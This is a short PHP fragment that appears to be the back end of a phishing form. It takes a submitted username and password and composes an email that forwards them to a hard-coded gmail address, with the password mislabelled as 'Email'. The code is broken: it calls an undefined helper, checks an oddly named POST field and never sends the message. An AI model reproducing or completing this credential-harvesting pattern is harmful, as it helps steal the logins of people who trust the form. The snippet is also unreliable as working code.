<?php
if(isset($_POST['enrikgani77@gmail.com'])){
    $email_to = "enrikgani77@gmail.com";
    $email_subject = "Email subject";
    $username = $_POST['username']; 
    $password = $_POST['password']; 
    
        $email_message = "Form details below.\n\n";
        $email_message .= "Name: ".clean_string($username)."\n";
        $email_message .= "Email: ".clean_string($password)."\n";
    }
        ?>
       